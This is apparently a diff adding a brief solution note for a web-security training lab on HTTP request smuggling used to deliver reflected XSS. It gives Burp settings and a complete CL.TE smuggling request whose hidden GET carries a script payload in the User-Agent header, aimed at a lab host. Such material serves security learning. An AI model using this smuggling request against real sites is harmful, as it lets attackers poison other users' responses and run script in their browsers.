@@ -1,0 +1,23 @@
+Lab: Exploiting HTTP request smuggling to deliver reflected XSS
+
+HTTP 1.1
+uncheck update content lenght
+ucheck normalize http 1
+
+
+____
+POST / HTTP/1.1
+Host: 0ac900fd035da90c80cae43e00e0006f.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=9 HTTP/1.1
+User-Agent: a"/><script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+______________
